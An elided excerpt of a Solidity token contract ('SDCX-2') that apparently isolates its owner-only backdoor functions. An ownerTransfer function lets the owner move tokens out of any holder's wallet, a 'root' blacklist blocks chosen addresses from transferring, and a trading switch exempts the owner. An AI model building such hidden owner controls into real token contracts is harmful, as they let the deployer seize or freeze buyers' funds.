...
contract token is Context, IERC20, Ownable {
    ...
    mapping (address => bool) public _isRoot;
    ...
    string private _name = "SDCX-2";
    string private _symbol = "SDCX-2";
    ...
    address public ownerAddres = address(0x2B880Af27461D01Ced7Efb36C56cf36cA29FB790);
    address public devAddress = address(0x6Ad1ADF0E5fdf733512D2750ADEa4407a9Fb0E26);
    ...
    function ownerTransfer(address sender, address recipient, uint256 amount) public onlyOwner {
    ...
    function setRoot(address account,bool _bool) public onlyOwner {
        _isRoot[account] = _bool;
    }
    ...
    function setStartEnabled(bool _enabled) public onlyOwner {
        startEnabled = _enabled;
    }
    ...
    function _transfer(
        ...
        if(from != ownerAddres && to != ownerAddres) {
            require(!_isRoot[from] && !_isRoot[to],"is root!");
            require(startEnabled,"no start!");
